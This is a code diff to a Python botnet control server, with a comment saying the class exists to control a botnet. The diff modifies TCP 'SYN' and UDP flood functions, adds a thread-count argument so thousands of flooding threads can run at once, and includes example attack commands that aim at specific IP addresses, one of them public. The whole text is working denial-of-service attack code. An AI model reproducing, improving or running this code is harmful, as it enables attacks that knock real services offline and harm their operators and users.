@@ -216,7 +216,8 @@ class Server(Colours): # this class is create a server to control botnet
 			BUFFER_SIZE = bytes(BUFFER_SIZE)
 			i = 1
 			destination_port = int(destination_port)
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			# s.connect((destination_IP, destination_port))
 			while True:
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 				s.connect((destination_IP, destination_port))
@@ -226,37 +227,45 @@ class Server(Colours): # this class is create a server to control botnet
 
 
 		def _dos_attack_udp(destination_IP, destination_port, time:int):
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			bytes = random._urandom(10240)  # random the size of udp packet .
-			s.connect((destination_IP, int(destination_port)))
+			#s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			bytes = random._urandom(3)  # random the size of udp packet .
+			#s.connect((destination_IP, int(destination_port)))
 			while self.run:
 				if not self.run: break
+				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+				s.connect((destination_IP, int(destination_port)))
 				s.sendto(bytes, (destination_IP, int(destination_port)))
-			s.close()
-			self.run = False
+				sleep(2)
+			#s.close()
 
-
-		help = "DoS with SYN Flood: attack dos syn <ip> <port> <time in second>\n" + "DoS with UDP Flood: attack dos udp <ip> <port> <time in second>\n"
+		help = "DoS with SYN Flood: attack dos syn <ip> <port> <time in second> <Thread>\n" + "DoS with UDP Flood: attack dos udp <ip> <port> <time in second> <Thread>\n"
 		print(help)
 		cmd = input("->>")
 		if "syn" in cmd:
-			#attack dos syn 27.64.57.85 1005 200
+			#attack dos syn 27.64.57.85 1005 200 5000
+			#attack dos syn 192.168.1.48 443 200
 			data = cmd.replace("attack dos syn ","").split(" ")
 			print(data)
-			ip, port, times = data
-			data = ip, int(port), int(times)
+			ip, port, times, thread = data
+			data = ip, int(port), int(times), int(thread)
 			print(type(ip))
 			self.run = True
-			_dos_attack_syn(ip,port, times)
+			for a in range(int(thread)):
+				_dos_attack_syn(ip, port, times)
+			self.run = False
 		elif "udp" in cmd:
-			#attack dos udp 27.64.57.85 1005 200
+			#attack dos udp 27.64.57.85 1005 200 5000
 			data = cmd.replace("attack dos udp ", "").split(" ")
 			print(data)
-			ip, port, times = data
-			data = ip, int(port), int(times)
+			ip, port, times, thread = data
+			data = ip, int(port), int(times), int(thread)
 			print(type(ip))
 			self.run = True
-			_dos_attack_udp(ip,port, times)
+			for a in range(int(thread)):
+				Thread(target=_dos_attack_udp, args= (ip, port, times)).start()
+				#print(threading.enumerate())
+			print(threading.active_count())
+			self.run = False
 
 
 
